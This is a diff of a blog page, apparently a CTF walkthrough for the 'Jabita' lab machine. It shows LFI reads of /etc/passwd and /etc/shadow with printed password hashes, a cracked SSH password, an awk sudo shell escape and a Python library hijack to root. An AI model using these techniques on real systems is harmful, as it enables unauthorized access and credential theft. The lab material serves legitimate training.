@@ -53,7 +53,7 @@
         },
         "datePublished": "2026-07-07",
         "description": "Walkthrough for the Jabita machine.",
-        "wordCount":  555 ,
+        "wordCount":  504 ,
         "mainEntityOfPage": "https://nvru.github.io/posts/hmv/jabita/",
         "dateModified": "2026-07-07",
         "image": {
@@ -83,9 +83,9 @@
 		<meta property="article:tag" content="Ctf">
 		<meta property="article:tag" content="Walkthrough">
 		<meta property="article:tag" content="Linux">
-		<meta property="article:tag" content="Web">
+		<meta property="article:tag" content="Apache">
 		<meta property="article:tag" content="Lfi">
-		<meta property="article:tag" content="Sudo">
+		<meta property="article:tag" content="Ssh">
 
 
     
@@ -207,189 +207,165 @@ stroke-linejoin="round" class="feather feather-home">
         <summary><b>Table of Contents</b></summary>
         <nav id="TableOfContents">
   <ul>
-    <li><a href="#target-information">Target Information</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#rustscan">RustScan</a>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#port-scanning">Port Scanning</a>
       <ul>
+        <li><a href="#rustscan">RustScan</a></li>
         <li><a href="#results">Results</a></li>
-      </ul>
-    </li>
-    <li><a href="#nmap">Nmap</a>
-      <ul>
+        <li><a href="#nmap">Nmap</a></li>
         <li><a href="#results-1">Results</a></li>
       </ul>
     </li>
-  </ul>
-
-  <ul>
-    <li><a href="#http-port-80">HTTP (Port 80)</a></li>
-    <li><a href="#directory-brute-force">Directory Brute Force</a>
+    <li><a href="#web-enumeration">Web Enumeration</a>
       <ul>
+        <li><a href="#directory-enumeration">Directory Enumeration</a></li>
         <li><a href="#reading-sensitive-files">Reading Sensitive Files</a></li>
       </ul>
     </li>
-  </ul>
-
-  <ul>
-    <li><a href="#jack--jaba">jack → jaba</a></li>
-    <li><a href="#jaba--root">jaba → root</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#ssh">SSH</a></li>
+    <li><a href="#initial-access">Initial Access</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#jack--jaba">jack → jaba</a></li>
+        <li><a href="#jaba--root">jaba → root</a></li>
+      </ul>
+    </li>
+    <li><a href="#credentials">Credentials</a></li>
+    <li><a href="#flags">Flags</a></li>
   </ul>
 </nav>
     </details>
             <div class="page-content">
-                <p><img src="/images/hmv/jabita/vm.png" alt="Jabita VM"></p>
-<h2 id="target-information">Target Information</h2>
-<table>
-	<thead>
-			<tr>
-					<th>Role</th>
-					<th>IP Address</th>
-			</tr>
-	</thead>
-	<tbody>
-			<tr>
-					<td>Attacker</td>
-					<td><code>10.10.10.2</code></td>
-			</tr>
-			<tr>
-					<td>Machine</td>
-					<td><code>10.10.10.15</code></td>
-			</tr>
-	</tbody>
-</table>
+                <h2 id="overview">Overview</h2>
+<ul>
+<li><strong>Attacker IP:</strong> <code>10.10.10.2</code></li>
+<li><strong>Target Machine IP:</strong> <code>10.10.10.15</code></li>
+</ul>
+<p>The objective was to enumerate the target, identify exposed services, gain initial access through a Local File Inclusion vulnerability, and escalate privileges through sudo misconfigurations and Python library hijacking.</p>
+<p><img src="/images/hmv/jabita/vm.png" alt="Machine information"></p>
 <hr>
-<h1 id="port-scanning">Port Scanning</h1>
-<h2 id="rustscan">RustScan</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.10.10.15 -- -oA nmap/rust
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="rustscan">RustScan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rustscan -a 10.10.10.15 -- -A -oA nmap/rust
 </span></span></code></pre></div><h3 id="results">Results</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Open 10.10.10.15:22
 </span></span><span style="display:flex;"><span>Open 10.10.10.15:80
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>[~] Starting Script(s)
-</span></span><span style="display:flex;"><span>[&gt;] Running script &#34;nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -oA nmap/rust&#34; on ip 10.10.10.15
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
-</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack
-</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
 </span></span></code></pre></div><hr>
-<h2 id="nmap">Nmap</h2>
+<h3 id="nmap">Nmap</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sSCV -A -p22,80 -oA nmap/22_80 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> 10.10.10.15
 </span></span></code></pre></div><h3 id="results-1">Results</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
 </span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>| ssh-hostkey:
-</span></span><span style="display:flex;"><span>|   256 00:b0:03:d3:92:f8:a0:f9:5a:93:20:7b:f8:0a:aa:da (ECDSA)
-</span></span><span style="display:flex;"><span>|_  256 dd:b4:26:1d:0c:e7:38:c3:7a:2f:07:be:f8:74:3e:bc (ED25519)
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html)
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 (Ubuntu)
-</span></span></code></pre></div><p>Only two TCP ports are exposed:</p>
-<ul>
-<li><strong>22</strong> - OpenSSH</li>
-<li><strong>80</strong> - HTTP (Apache)</li>
-</ul>
+</span></span><span style="display:flex;"><span>Service Info:
+</span></span><span style="display:flex;"><span>OS: Linux
+</span></span></code></pre></div><p>Only SSH and HTTP were exposed, so web enumeration was the obvious next step.</p>
 <hr>
-<h1 id="enumeration">Enumeration</h1>
-<h2 id="http-port-80">HTTP (Port 80)</h2>
-<p>Browsing to the web application revealed a very simple page with nothing immediately interesting.</p>
-<p><img src="/images/hmv/jabita/http.png" alt="HTTP"></p>
-<p>Inspecting the page source also revealed nothing useful.</p>
-<p>Checking for a <code>robots.txt</code> file likewise produced no results.</p>
-<p><img src="/images/hmv/jabita/no_robots.png" alt="No Robots"></p>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p>Browsing to port 80 revealed a simple webpage with no immediately useful information.</p>
+<p><img src="/images/hmv/jabita/http.png" alt="HTTP homepage"></p>
+<p>Inspecting the page source also revealed nothing interesting.</p>
+<p>I also checked for <code>robots.txt</code>, but no useful entries were found.</p>
+<p><img src="/images/hmv/jabita/no_robots.png" alt="No robots.txt"></p>
 <hr>
-<h2 id="directory-brute-force">Directory Brute Force</h2>
-<p>Since the default web page provided no useful information, I performed directory enumeration.</p>
-<p>A hidden <strong>building</strong> directory was discovered.</p>
-<p><img src="/images/hmv/jabita/dir_brute_force.png" alt="Directory Brute Force"></p>
-<p>Inspecting the source code inside this directory revealed a parameter that appeared to load files from the server.</p>
-<p>The first attack vector that came to mind was <strong>Local File Inclusion (LFI)</strong>.</p>
-<ul>
-<li><code>https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html</code></li>
-</ul>
-<p><img src="/images/hmv/jabita/building_src.png" alt="Source Code"></p>
-<p>Testing with <code>/etc/passwd</code> confirmed the vulnerability.</p>
-<p><img src="/images/hmv/jabita/suc_lfi.png" alt="Successful LFI"></p>
-<p>The output revealed two local users:</p>
-<ul>
-<li><code>jack</code></li>
-<li><code>jaba</code></li>
-</ul>
-<p>It also showed that <strong>LXD</strong> was installed on the system.</p>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<p>Since the default page did not provide any useful information, I performed directory brute forcing.</p>
+<p>A hidden directory named:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>building
+</span></span></code></pre></div><p>was discovered.</p>
+<p><img src="/images/hmv/jabita/dir_brute_force.png" alt="Directory brute force"></p>
+<p>Inspecting the source code revealed a parameter that appeared to load files from the server.</p>
+<p>The first thing to test was a Local File Inclusion vulnerability.</p>
 <p>Reference:</p>
 <ul>
-<li><a href="https://www.geeksforgeeks.org/linux-unix/users-in-linux-system-administration/">https://www.geeksforgeeks.org/linux-unix/users-in-linux-system-administration/</a></li>
+<li><a href="https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html">https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html</a></li>
 </ul>
+<p><img src="/images/hmv/jabita/building_src.png" alt="Source code"></p>
+<p>Testing the parameter with <code>/etc/passwd</code> confirmed the vulnerability.</p>
+<p><img src="/images/hmv/jabita/suc_lfi.png" alt="Successful LFI"></p>
+<p>The output revealed two local users:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jack
+</span></span><span style="display:flex;"><span>jaba
+</span></span></code></pre></div><p>It also revealed that LXD was installed on the machine.</p>
 <hr>
 <h3 id="reading-sensitive-files">Reading Sensitive Files</h3>
-<p>After confirming the LFI vulnerability, I continued enumerating the filesystem by attempting to read interesting files.</p>
-<p>Accessing files within the users&rsquo; home directories, such as <code>.bash_history</code> and <code>.bashrc</code>, was unsuccessful, most likely because of permission restrictions.</p>
-<p>However, requesting <code>/etc/shadow</code> through the vulnerable parameter succeeded, exposing the password hashes for the local users.</p>
+<p>After confirming the LFI vulnerability, I continued enumerating sensitive files.</p>
+<p>Attempts to read files from user home directories, such as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>.bash_history
+</span></span><span style="display:flex;"><span>.bashrc
+</span></span></code></pre></div><p>were unsuccessful due to permission restrictions.</p>
+<p>However, <code>/etc/shadow</code> was readable through the vulnerable parameter.</p>
 <p><img src="/images/hmv/jabita/shadow_lfi.png" alt="Shadow via LFI"></p>
-<p>The relevant hashes were:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1:19240:0:99999:7:::
-</span></span><span style="display:flex;"><span>jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::
-</span></span><span style="display:flex;"><span>jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::
-</span></span></code></pre></div><p>I attempted to crack the hashes using <strong>John the Ripper</strong>.</p>
-<p>The password for <strong>jack</strong> was recovered successfully.</p>
-<p><img src="/images/hmv/jabita/john_jack.png" alt="John Cracking"></p>
+<p>The password hashes for the local users were exposed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1
+</span></span></code></pre></div><p>I attempted to crack the hashes using John the Ripper.</p>
+<p>The password for <code>jack</code> was successfully recovered.</p>
+<p><img src="/images/hmv/jabita/john_jack.png" alt="John cracking"></p>
 <hr>
-<h1 id="initial-access">Initial Access</h1>
-<p>Using the recovered credentials, I authenticated to the machine via SSH.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jack : joaninha
-</span></span></code></pre></div><p><img src="/images/hmv/jabita/suc_ssh_jack.png" alt="SSH Login"></p>
+<h2 id="initial-access">Initial Access</h2>
+<p>Using the recovered credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Username: jack
+</span></span><span style="display:flex;"><span>Password: joaninha
+</span></span></code></pre></div><p>SSH access was successful.</p>
+<p><img src="/images/hmv/jabita/suc_ssh_jack.png" alt="SSH as jack"></p>
 <hr>
-<h1 id="privilege-escalation">Privilege Escalation</h1>
-<h2 id="jack--jaba">jack → jaba</h2>
-<p>Checking the user&rsquo;s sudo permissions revealed the following:</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="jack--jaba">jack → jaba</h3>
+<p>The first thing I checked was sudo permissions.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
-</span></span></code></pre></div><p><img src="/images/hmv/jabita/sudo_l_jack.png" alt="sudo -l"></p>
-<p>The user <strong>jack</strong> could execute <strong>awk</strong> as <strong>jaba</strong> without supplying a password.</p>
-<p>Initially I attempted to inspect <code>jaba</code>&rsquo;s home directory, but I lacked the necessary permissions.</p>
-<p><img src="/images/hmv/jabita/no_perm_home.png" alt="No Permission"></p>
-<p>Consulting both the man page and GTFOBins showed that <strong>awk</strong> can execute arbitrary system commands.</p>
-<p>The following command spawns a shell as <strong>jaba</strong>.</p>
+</span></span></code></pre></div><p><img src="/images/hmv/jabita/sudo_l_jack.png" alt="sudo permissions"></p>
+<p>The user <code>jack</code> could execute <code>awk</code> as <code>jaba</code> without supplying a password.</p>
+<p>Attempts to access <code>jaba</code>&rsquo;s home directory were unsuccessful because of permission restrictions.</p>
+<p><img src="/images/hmv/jabita/no_perm_home.png" alt="No permission"></p>
+<p>Using GTFOBins and the awk documentation, I found that <code>awk</code> can execute arbitrary system commands.</p>
+<p>The following command spawned a shell as <code>jaba</code>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -u jaba /usr/bin/awk <span style="color:#e6db74">&#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39;</span>
-</span></span></code></pre></div><p><img src="/images/hmv/jabita/exp_awk_sudo_jaba.png" alt="AWK Exploit"></p>
+</span></span></code></pre></div><p><img src="/images/hmv/jabita/exp_awk_sudo_jaba.png" alt="AWK exploit"></p>
 <hr>
-<h2 id="jaba--root">jaba → root</h2>
-<p>After switching to <strong>jaba</strong>, I located the user flag along with the user&rsquo;s Python history file.</p>
-<p>Reading <code>.python_history</code> revealed the following command had previously been executed:</p>
+<h3 id="jaba--root">jaba → root</h3>
+<p>After switching to <code>jaba</code>, I found the user flag and a Python history file.</p>
+<p>Reading <code>.python_history</code> revealed:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod u+s /bin/bash
-</span></span></code></pre></div><p><img src="/images/hmv/jabita/flag_py_hist.png" alt="Python History"></p>
-<p>This suggested that a SUID binary might exist, so I searched the system.</p>
+</span></span></code></pre></div><p><img src="/images/hmv/jabita/flag_py_hist.png" alt="Python history"></p>
+<p>This suggested that a SUID binary might have been created.</p>
+<p>I searched for SUID files:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 -type f 2&gt;/dev/null
-</span></span></code></pre></div><p>However, nothing unusual was found.</p>
+</span></span></code></pre></div><p>However, no unusual SUID binaries were found.</p>
 <p><img src="/images/hmv/jabita/find_no_suid.png" alt="No SUID"></p>
-<p>Running <code>sudo -l</code> again revealed something far more interesting.</p>
+<p>Running <code>sudo -l</code> again revealed a more interesting entry.</p>
 <p><img src="/images/hmv/jabita/sudo_l_jaba.png" alt="sudo -l jaba"></p>
-<p>The user could execute the following script as root:</p>
+<p>The user could execute:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>/usr/bin/python3 /usr/bin/clean.py
-</span></span></code></pre></div><p>Examining the script showed that it imported a custom Python module named <code>wild</code>.</p>
-<p>To locate the module I searched the filesystem.</p>
+</span></span></code></pre></div><p>as root.</p>
+<hr>
+<h4 id="python-library-hijacking">Python Library Hijacking</h4>
+<p>Inspecting <code>clean.py</code> showed that it imported a custom module:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> wild
+</span></span></code></pre></div><p>I searched for the module location:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -type f -name wild.py -ls 2&gt;/dev/null
-</span></span></code></pre></div><p>Fortunately, the located <code>wild.py</code> file was writable by all users.</p>
-<p>I replaced its contents with the following:</p>
+</span></span></code></pre></div><p>The discovered <code>wild.py</code> file was writable by all users.</p>
+<p>I replaced its contents with:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;bash -i&#34;</span>)
-</span></span></code></pre></div><p>Running the allowed sudo command then executed the malicious module as <strong>root</strong>, resulting in a root shell.</p>
-<p><img src="/images/hmv/jabita/su_root.png" alt="Root Shell"></p>
+</span></span></code></pre></div><p>Running the allowed sudo command executed the modified module as root.</p>
+<p><img src="/images/hmv/jabita/su_root.png" alt="Root shell"></p>
 <hr>
-<h1 id="credentials">Credentials</h1>
-<h2 id="ssh">SSH</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jack : joaninha
+<h2 id="credentials">Credentials</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>jack:joaninha
 </span></span></code></pre></div><hr>
-<h1 id="flags">Flags</h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user flag : 2e0942f09699435811c1be613cbc7a39
-</span></span><span style="display:flex;"><span>root flag : f4bb4cce1d4ed06fc77ad84ccf70d3fe
+<h2 id="flags">Flags</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>user:2e0942f09699435811c1be613cbc7a39
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root:f4bb4cce1d4ed06fc77ad84ccf70d3fe
 </span></span></code></pre></div>
             </div>
         </article></main>
